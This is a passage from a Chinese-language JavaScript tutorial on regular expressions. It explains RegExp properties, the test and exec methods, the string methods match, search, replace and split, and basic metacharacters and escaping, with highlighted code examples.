<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/abc/igm</span>;</span><br><span class="line"></span><br><span class="line">r.ignoreCase <span class="comment">// true</span></span><br><span class="line">r.global <span class="comment">// true</span></span><br><span class="line">r.multiline <span class="comment">// true</span></span><br><span class="line">r.flags <span class="comment">// &#x27;gim&#x27;</span></span><br></pre></td></tr></table></figure>
<p>另一类是与修饰符无关的属性，主要是下面两个。</p>
<ul>
<li><code>RegExp.prototype.lastIndex</code>：返回一个整数，表示下一次开始搜索的位置。该属性可读写，但是只在进行连续搜索时有意义，详细介绍请看后文。</li>
<li><code>RegExp.prototype.source</code>：返回正则表达式的字符串形式（不包括反斜杠），该属性只读。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/abc/igm</span>;</span><br><span class="line"></span><br><span class="line">r.lastIndex <span class="comment">// 0</span></span><br><span class="line">r.source <span class="comment">// &quot;abc&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="10-3-实例方法"><a href="#10-3-实例方法" class="headerlink" title="10.3 实例方法"></a>10.3 实例方法</h4><h5 id="10-3-1-RegExp-prototype-test"><a href="#10-3-1-RegExp-prototype-test" class="headerlink" title="10.3.1 RegExp.prototype.test()"></a>10.3.1 RegExp.prototype.test()</h5><p>正则实例对象的<code>test</code>方法返回一个布尔值，表示当前模式是否能匹配参数字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/cat/.test(<span class="string">&#x27;cats and dogs&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码验证参数字符串之中是否包含<code>cat</code>，结果返回<code>true</code>。<br>如果正则表达式带有<code>g</code>修饰符，则每一次<code>test</code>方法都从上一次结束的位置开始向后匹配</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/x/g</span>;</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;_x_x&#x27;</span>;</span><br><span class="line"></span><br><span class="line">r.lastIndex <span class="comment">// 0</span></span><br><span class="line">r.test(s) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">r.lastIndex <span class="comment">// 2</span></span><br><span class="line">r.test(s) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">r.lastIndex <span class="comment">// 4</span></span><br><span class="line">r.test(s) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码的正则表达式使用了<code>g</code>修饰符，表示是全局搜索，会有多个结果。接着，三次使用<code>test</code>方法，每一次开始搜索的位置都是上一次匹配的后一个位置。<br>带有<code>g</code>修饰符时，可以通过正则对象的<code>lastIndex</code>属性指定开始搜索的位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/x/g</span>;</span><br><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;_x_x&#x27;</span>;</span><br><span class="line"></span><br><span class="line">r.lastIndex = <span class="number">4</span>;</span><br><span class="line">r.test(s) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">r.lastIndex <span class="comment">// 0</span></span><br><span class="line">r.test(s)</span><br></pre></td></tr></table></figure>
<p>上面代码指定从字符串的第五个位置开始搜索，这个位置为空，所以返回<code>false</code>。同时，<code>lastIndex</code>属性重置为<code>0</code>，所以第二次执行<code>r.test(s)</code>会返回<code>true</code><br>注意，带有<code>g</code>修饰符时，正则表达式内部会记住上一次的<code>lastIndex</code>属性，这时不应该更换所要匹配的字符串，否则会有一些难以察觉的错误。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/bb/g</span>;</span><br><span class="line">r.test(<span class="string">&#x27;bb&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">r.test(<span class="string">&#x27;-bb-&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于正则表达式<code>r</code>是从上一次的<code>lastIndex</code>位置开始匹配，导致第二次执行<code>test</code>方法时出现预期以外的结果。<br><code>lastIndex</code>属性只对同一个正则表达式有效，所以下面这样写是错误的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="regexp">/a/g</span>.test(<span class="string">&#x27;babaa&#x27;</span>)) count++;</span><br></pre></td></tr></table></figure>
<p>上面代码会导致无限循环，因为<code>while</code>循环的每次匹配条件都是一个新的正则表达式，导致<code>lastIndex</code>属性总是等于<code>0</code>。<br>如果正则模式是一个空字符串，则匹配所有字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;&#x27;</span>).test(<span class="string">&#x27;abc&#x27;</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="10-3-2-RegExp-prototype-exec"><a href="#10-3-2-RegExp-prototype-exec" class="headerlink" title="10.3.2 RegExp.prototype.exec()"></a>10.3.2 RegExp.prototype.exec()</h5><p>正则实例对象的<code>exec()</code>方法，用来返回匹配结果。如果发现匹配，就返回一个数组，成员是匹配成功的子字符串，否则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;_x_x&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> r1 = <span class="regexp">/x/</span>;</span><br><span class="line"><span class="keyword">var</span> r2 = <span class="regexp">/y/</span>;</span><br><span class="line"></span><br><span class="line">r1.exec(s) <span class="comment">// [&quot;x&quot;]</span></span><br><span class="line">r2.exec(s) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，正则对象<code>r1</code>匹配成功，返回一个数组，成员是匹配结果；正则对象<code>r2</code>匹配失败，返回<code>null</code>。<br>如果正则表示式包含圆括号（即含有“组匹配”），则返回的数组会包括多个成员。第一个成员是整个匹配成功的结果，后面的成员就是圆括号对应的匹配成功的组。也就是说，第二个成员对应第一个括号，第三个成员对应第二个括号，以此类推。整个数组的<code>length</code>属性等于组匹配的数量再加1。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;_x_x&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> r = <span class="regexp">/_(x)/</span>;</span><br><span class="line"></span><br><span class="line">r.exec(s) <span class="comment">// [&quot;_x&quot;, &quot;x&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码的<code>exec()</code>方法，返回一个数组。第一个成员是整个匹配的结果，第二个成员是圆括号匹配的结果。<br><code>exec()</code>方法的返回数组还包含以下两个属性：</p>
<ul>
<li><code>input</code>：整个原字符串。</li>
<li><code>index</code>：模式匹配成功的开始位置（从0开始计数）。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/a(b+)a/</span>;</span><br><span class="line"><span class="keyword">var</span> arr = r.exec(<span class="string">&#x27;_abbba_aba_&#x27;</span>);</span><br><span class="line"></span><br><span class="line">arr <span class="comment">// [&quot;abbba&quot;, &quot;bbb&quot;]</span></span><br><span class="line"></span><br><span class="line">arr.index <span class="comment">// 1</span></span><br><span class="line">arr.input <span class="comment">// &quot;_abbba_aba_&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中的<code>index</code>属性等于1，是因为从原字符串的第二个位置开始匹配成功。<br>如果正则表达式加上<code>g</code>修饰符，则可以使用多次<code>exec()</code>方法，下一次搜索的位置从上一次匹配成功结束的位置开始。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/a/g</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;abc_abc_abc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> r1 = reg.exec(str);</span><br><span class="line">r1 <span class="comment">// [&quot;a&quot;]</span></span><br><span class="line">r1.index <span class="comment">// 0</span></span><br><span class="line">reg.lastIndex <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> r2 = reg.exec(str);</span><br><span class="line">r2 <span class="comment">// [&quot;a&quot;]</span></span><br><span class="line">r2.index <span class="comment">// 4</span></span><br><span class="line">reg.lastIndex <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> r3 = reg.exec(str);</span><br><span class="line">r3 <span class="comment">// [&quot;a&quot;]</span></span><br><span class="line">r3.index <span class="comment">// 8</span></span><br><span class="line">reg.lastIndex <span class="comment">// 9</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> r4 = reg.exec(str);</span><br><span class="line">r4 <span class="comment">// null</span></span><br><span class="line">reg.lastIndex <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>上面代码连续用了四次<code>exec()</code>方法，前三次都是从上一次匹配结束的位置向后匹配。当第三次匹配结束以后，整个字符串已经到达尾部，匹配结果返回<code>null</code>，正则实例对象的<code>lastIndex</code>属性也重置为0，意味着第四次匹配将从头开始。<br>利用<code>g</code>修饰符允许多次匹配的特点，可以用一个循环完成全部匹配。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/a/g</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;abc_abc_abc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> match = reg.exec(str);</span><br><span class="line">  <span class="keyword">if</span> (!match) <span class="keyword">break</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;#&#x27;</span> + match.index + <span class="string">&#x27;:&#x27;</span> + match[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// #0:a</span></span><br><span class="line"><span class="comment">// #4:a</span></span><br><span class="line"><span class="comment">// #8:a</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，只要<code>exec()</code>方法不返回<code>null</code>，就会一直循环下去，每次输出匹配的位置和匹配的文本。<br>正则实例对象的<code>lastIndex</code>属性不仅可读，还可写。设置了<code>g</code>修饰符的时候，只要手动设置了<code>lastIndex</code>的值，就会从指定位置开始匹配。</p>
<h4 id="10-4-字符串的实例方法"><a href="#10-4-字符串的实例方法" class="headerlink" title="10.4 字符串的实例方法"></a>10.4 字符串的实例方法</h4><p>字符串的实例方法之中，有4种与正则表达式有关。</p>
<ul>
<li><code>String.prototype.match()</code>：返回一个数组，成员是所有匹配的子字符串。</li>
<li><code>String.prototype.search()</code>：按照给定的正则表达式进行搜索，返回一个整数，表示匹配开始的位置。</li>
<li><code>String.prototype.replace()</code>：按照给定的正则表达式进行替换，返回替换后的字符串。</li>
<li><code>String.prototype.split()</code>：按照给定规则进行字符串分割，返回一个数组，包含分割后的各个成员。</li>
</ul>
<h5 id="10-4-1-String-prototype-match"><a href="#10-4-1-String-prototype-match" class="headerlink" title="10.4.1 String.prototype.match()"></a>10.4.1 String.prototype.match()</h5><p>字符串实例对象的<code>match</code>方法对字符串进行正则匹配，返回匹配结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;_x_x&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> r1 = <span class="regexp">/x/</span>;</span><br><span class="line"><span class="keyword">var</span> r2 = <span class="regexp">/y/</span>;</span><br><span class="line"></span><br><span class="line">s.match(r1) <span class="comment">// [&quot;x&quot;]</span></span><br><span class="line">s.match(r2) <span class="comment">// null</span></span><br></pre></td></tr></table></figure>
<p>从上面代码可以看到，字符串的<code>match</code>方法与正则对象的<code>exec</code>方法非常类似：匹配成功返回一个数组，匹配失败返回<code>null</code>。<br>如果正则表达式带有<code>g</code>修饰符，则该方法与正则对象的<code>exec</code>方法行为不同，会一次性返回所有匹配成功的结果。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&#x27;abba&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> r = <span class="regexp">/a/g</span>;</span><br><span class="line"></span><br><span class="line">s.match(r) <span class="comment">// [&quot;a&quot;, &quot;a&quot;]</span></span><br><span class="line">r.exec(s) <span class="comment">// [&quot;a&quot;]</span></span><br></pre></td></tr></table></figure>
<p>设置正则表达式的<code>lastIndex</code>属性，对<code>match</code>方法无效，匹配总是从字符串的第一个字符开始。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="regexp">/a|b/g</span>;</span><br><span class="line">r.lastIndex = <span class="number">7</span>;</span><br><span class="line"><span class="string">&#x27;xaxb&#x27;</span>.match(r) <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;]</span></span><br><span class="line">r.lastIndex <span class="comment">// 0</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，设置正则对象的<code>lastIndex</code>属性是无效的。</p>
<h5 id="10-4-2-String-prototype-search"><a href="#10-4-2-String-prototype-search" class="headerlink" title="10.4.2 String.prototype.search()"></a>10.4.2 String.prototype.search()</h5><p>字符串对象的<code>search</code>方法，返回第一个满足条件的匹配结果在整个字符串中的位置。如果没有任何匹配，则返回<code>-1</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;_x_x&#x27;</span>.search(<span class="regexp">/x/</span>)</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第一个匹配结果出现在字符串的<code>1</code>号位置。</p>
<h5 id="10-4-3-String-prototype-replace"><a href="#10-4-3-String-prototype-replace" class="headerlink" title="10.4.3 String.prototype.replace()"></a>10.4.3 String.prototype.replace()</h5><p>字符串对象的<code>replace</code>方法可以替换匹配的值。它接受两个参数，第一个是正则表达式，表示搜索模式，第二个是替换的内容。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">str.replace(search, replacement)</span><br></pre></td></tr></table></figure>
<p>正则表达式如果不加<code>g</code>修饰符，就替换第一个匹配成功的值，否则替换所有匹配成功的值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aaa&#x27;</span>.replace(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment">// &quot;baa&quot;</span></span><br><span class="line"><span class="string">&#x27;aaa&#x27;</span>.replace(<span class="regexp">/a/</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment">// &quot;baa&quot;</span></span><br><span class="line"><span class="string">&#x27;aaa&#x27;</span>.replace(<span class="regexp">/a/g</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment">// &quot;bbb&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，最后一个正则表达式使用了<code>g</code>修饰符，导致所有的<code>a</code>都被替换掉了。<br><code>replace</code>方法的一个应用，就是消除字符串首尾两端的空格。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">&#x27;  #id div.class  &#x27;</span>;</span><br><span class="line"></span><br><span class="line">str.replace(<span class="regexp">/^\s+|\s+$/g</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;#id div.class&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>replace</code>方法的第二个参数可以使用美元符号<code>$</code>，用来指代所替换的内容。</p>
<ul>
<li><code>$&amp;</code>：匹配的子字符串。</li>
<li><code>$` </code>：匹配结果前面的文本。</li>
<li><code>$&#39;</code>：匹配结果后面的文本。</li>
<li><code>$n</code>：匹配成功的第<code>n</code>组内容，<code>n</code>是从1开始的自然数。</li>
<li><code>$$</code>：指代美元符号<code>$</code>。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;hello world&#x27;</span>.replace(<span class="regexp">/(\w+)\s(\w+)/</span>, <span class="string">&#x27;$2 $1&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;world hello&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span>.replace(<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;[$`-$&amp;-$\&#x27;]&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;a[a-b-c]c&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第一个例子是将匹配的组互换位置，第二个例子是改写匹配的值。<br><code>replace</code>方法的第二个参数还可以是一个函数，将每一个匹配内容替换为函数返回值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;3 and 5&#x27;</span>.replace(<span class="regexp">/[0-9]+/g</span>, <span class="function"><span class="keyword">function</span> (<span class="params">match</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span> * match;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// &quot;6 and 10&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">&#x27;The quick brown fox jumped over the lazy dog.&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> pattern = <span class="regexp">/quick|brown|lazy/ig</span>;</span><br><span class="line"></span><br><span class="line">a.replace(pattern, <span class="function"><span class="keyword">function</span> <span class="title">replacer</span>(<span class="params">match</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> match.toUpperCase();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// The QUICK BROWN fox jumped over the LAZY dog.</span></span><br></pre></td></tr></table></figure>
<p>作为<code>replace</code>方法第二个参数的替换函数，可以接受多个参数。其中，第一个参数是捕捉到的内容，第二个参数是捕捉到的组匹配（有多少个组匹配，就有多少个对应的参数）。此外，最后还可以添加两个参数，倒数第二个参数是捕捉到的内容在整个字符串中的位置（比如从第五个位置开始），最后一个参数是原字符串。下面是一个网页模板替换的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> prices = &#123;</span><br><span class="line">  <span class="string">&#x27;p1&#x27;</span>: <span class="string">&#x27;$1.99&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;p2&#x27;</span>: <span class="string">&#x27;$9.99&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;p3&#x27;</span>: <span class="string">&#x27;$5.00&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> template = <span class="string">&#x27;&lt;span id=&quot;p1&quot;&gt;&lt;/span&gt;&#x27;</span></span><br><span class="line">  + <span class="string">&#x27;&lt;span id=&quot;p2&quot;&gt;&lt;/span&gt;&#x27;</span></span><br><span class="line">  + <span class="string">&#x27;&lt;span id=&quot;p3&quot;&gt;&lt;/span&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">template.replace(</span><br><span class="line">  /(<span class="xml"><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;)(.*?)(&quot;</span>&gt;</span>)(&lt;\/span&gt;)/g,</span></span><br><span class="line"><span class="xml">  function(match, $1, $2, $3, $4)&#123;</span></span><br><span class="line"><span class="xml">    return $1 + $2 + $3 + prices[$2] + $4;</span></span><br><span class="line"><span class="xml">  &#125;</span></span><br><span class="line"><span class="xml">);</span></span><br><span class="line"><span class="xml">// &quot;<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;p1&quot;</span>&gt;</span>$1.99<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;p2&quot;</span>&gt;</span>$9.99<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;p3&quot;</span>&gt;</span>$5.00<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码的捕捉模式中，有四个括号，所以会产生四个组匹配，在匹配函数中用<code>$1</code>到<code>$4</code>表示。匹配函数的作用是将价格插入模板中。</p>
<h5 id="10-4-4-String-prototype-split"><a href="#10-4-4-String-prototype-split" class="headerlink" title="10.4.4 String.prototype.split()"></a>10.4.4 String.prototype.split()</h5><p>字符串对象的<code>split</code>方法按照正则规则分割字符串，返回一个由分割后的各个部分组成的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">str.split(separator, [limit])</span><br></pre></td></tr></table></figure>
<p>该方法接受两个参数，第一个参数是正则表达式，表示分隔规则，第二个参数是返回数组的最大成员数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非正则分隔</span></span><br><span class="line"><span class="string">&#x27;a,  b,c, d&#x27;</span>.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, &#x27;  b&#x27;, &#x27;c&#x27;, &#x27; d&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 正则分隔，去除多余的空格</span></span><br><span class="line"><span class="string">&#x27;a,  b,c, d&#x27;</span>.split(<span class="regexp">/, */</span>)</span><br><span class="line"><span class="comment">// [ &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定返回数组的最大成员</span></span><br><span class="line"><span class="string">&#x27;a,  b,c, d&#x27;</span>.split(<span class="regexp">/, */</span>, <span class="number">2</span>)</span><br><span class="line">[ <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span> ]</span><br></pre></td></tr></table></figure>
<p>上面代码使用正则表达式，去除了子字符串的逗号后面的空格。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例一</span></span><br><span class="line"><span class="string">&#x27;aaa*a*&#x27;</span>.split(<span class="regexp">/a*/</span>)</span><br><span class="line"><span class="comment">// [ &#x27;&#x27;, &#x27;*&#x27;, &#x27;*&#x27; ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 例二</span></span><br><span class="line"><span class="string">&#x27;aaa**a*&#x27;</span>.split(<span class="regexp">/a*/</span>)</span><br><span class="line"><span class="comment">// [&quot;&quot;, &quot;*&quot;, &quot;*&quot;, &quot;*&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码的分割规则是0次或多次的<code>a</code>，由于正则默认是贪婪匹配，所以例一的第一个分隔符是<code>aaa</code>，第二个分割符是<code>a</code>，将字符串分成三个部分，包含开始处的空字符串。例二的第一个分隔符是<code>aaa</code>，第二个分隔符是0个<code>a</code>（即空字符），第三个分隔符是<code>a</code>，所以将字符串分成四个部分。<br>如果正则表达式带有括号，则括号匹配的部分也会作为数组成员返回</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;aaa*a*&#x27;</span>.split(<span class="regexp">/(a*)/</span>)</span><br><span class="line"><span class="comment">// [ &#x27;&#x27;, &#x27;aaa&#x27;, &#x27;*&#x27;, &#x27;a&#x27;, &#x27;*&#x27; ]</span></span><br></pre></td></tr></table></figure>
<p>上面代码的正则表达式使用了括号，第一个组匹配是<code>aaa</code>，第二个组匹配是<code>a</code>，它们都作为数组成员返回。</p>
<h4 id="10-5-匹配规则"><a href="#10-5-匹配规则" class="headerlink" title="10.5 匹配规则"></a>10.5 匹配规则</h4><h5 id="10-5-1-字面量字符和元字符"><a href="#10-5-1-字面量字符和元字符" class="headerlink" title="10.5.1 字面量字符和元字符"></a>10.5.1 字面量字符和元字符</h5><p>大部分字符在正则表达式中，就是字面的含义，比如<code>/a/</code>匹配<code>a</code>，<code>/b/</code>匹配<code>b</code>。如果在正则表达式之中，某个字符只表示它字面的含义（就像前面的<code>a</code>和<code>b</code>），那么它们就叫做“字面量字符”（literal characters）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/dog/.test(<span class="string">&#x27;old dog&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中正则表达式的<code>dog</code>，就是字面量字符，所以<code>/dog/</code>匹配<code>old dog</code>，因为它就表示<code>d</code>、<code>o</code>、<code>g</code>三个字母连在一起。<br>除了字面量字符以外，还有一部分字符有特殊含义，不代表字面的意思。它们叫做“元字符”（metacharacters），主要有以下几个。</p>
<h6 id="1-点字符（"><a href="#1-点字符（" class="headerlink" title="(1)点字符（.)"></a>(1)点字符（.)</h6><p>点字符（<code>.</code>）匹配除回车（<code>\r</code>）、换行(<code>\n</code>) 、行分隔符（<code>\u2028</code>）和段分隔符（<code>\u2029</code>）以外的所有字符。注意，对于码点大于<code>0xFFFF</code>字符，点字符不能正确匹配，会认为这是两个字符。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/c.t/</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>c.t</code>匹配<code>c</code>和<code>t</code>之间包含任意一个字符的情况，只要这三个字符在同一行，比如<code>cat</code>、<code>c2t</code>、<code>c-t</code>等等，但是不匹配<code>coot</code>。</p>
<h6 id="2-位置字符"><a href="#2-位置字符" class="headerlink" title="(2)位置字符"></a>(2)位置字符</h6><p>位置字符用来提示字符所处的位置，主要有两个字符。</p>
<ul>
<li><code>^</code> 表示字符串的开始位置</li>
<li><code>$</code> 表示字符串的结束位置</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test必须出现在开始位置</span></span><br><span class="line">/^test/.test(<span class="string">&#x27;test123&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// test必须出现在结束位置</span></span><br><span class="line">/test$/.test(<span class="string">&#x27;new test&#x27;</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从开始位置到结束位置只有test</span></span><br><span class="line">/^test$/.test(<span class="string">&#x27;test&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">/^test$/.test(<span class="string">&#x27;test test&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h6 id="3-选择符（-）"><a href="#3-选择符（-）" class="headerlink" title="(3)选择符（|）"></a>(3)选择符（|）</h6><p>竖线符号（<code>|</code>）在正则表达式中表示“或关系”（OR），即<code>cat|dog</code>表示匹配<code>cat</code>或<code>dog</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/<span class="number">11</span>|<span class="number">22</span>/.test(<span class="string">&#x27;911&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，正则表达式指定必须匹配<code>11</code>或<code>22</code>。<br>多个选择符可以联合使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 匹配fred、barney、betty之中的一个</span></span><br><span class="line">/fred|barney|betty/</span><br></pre></td></tr></table></figure>
<p>选择符会包括它前后的多个字符，比如<code>/ab|cd/</code>指的是匹配<code>ab</code>或者<code>cd</code>，而不是指匹配b或者<code>c</code>。如果想修改这个行为，可以使用圆括号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/a( |\t)b/.test(<span class="string">&#x27;a\tb&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码指的是，<code>a</code>和<code>b</code>之间有一个空格或者一个制表符。<br>其他的元字符还包括<code>\</code>、<code>*</code>、<code>+</code>、<code>?</code>、<code>()</code>、<code>[]</code>、<code>&#123;&#125;</code>等，将在下文解释。</p>
<h5 id="10-5-2-转义符"><a href="#10-5-2-转义符" class="headerlink" title="10.5.2 转义符"></a>10.5.2 转义符</h5><p>正则表达式中那些有特殊含义的元字符，如果要匹配它们本身，就需要在它们前面要加上反斜杠。比如要匹配<code>+</code>，就要写成<code>\+</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/<span class="number">1</span>+<span class="number">1</span>/.test(<span class="string">&#x27;1+1&#x27;</span>)</span><br><span class="line"><span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">/<span class="number">1</span>\+<span class="number">1</span>/.test(<span class="string">&#x27;1+1&#x27;</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，第一个正则表达式之所以不匹配，因为加号是元字符，不代表自身。第二个正则表达式使用反斜杠对加号转义，就能匹配成功。<br>正则表达式中，需要反斜杠转义的，一共有12个字符：<code>^</code>、<code>.</code>、<code>[</code>、<code>$</code>、<code>(</code>、<code>)</code>、<code>|</code>、<code>*</code>、<code>+</code>、<code>?</code>、<code>&#123;</code>和<code>\</code>。需要特别注意的是，如果使用<code>RegExp</code>方法生成正则对象，转义需要使用两个斜杠，因为字符串内部会先转义一次。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;1\+1&#x27;</span>)).test(<span class="string">&#x27;1+1&#x27;</span>)</span><br><span class="line"><span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;1\\+1&#x27;</span>)).test(<span class="string">&#x27;1+1&#x27;</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>RegExp</code>作为构造函数，参数是一个字符串。但是，在字符串内部，反斜杠也是转义字符，所以它会先被反斜杠转义一次，然后再被正则表达式转义一次，因此需要两个反斜杠转义。</p>
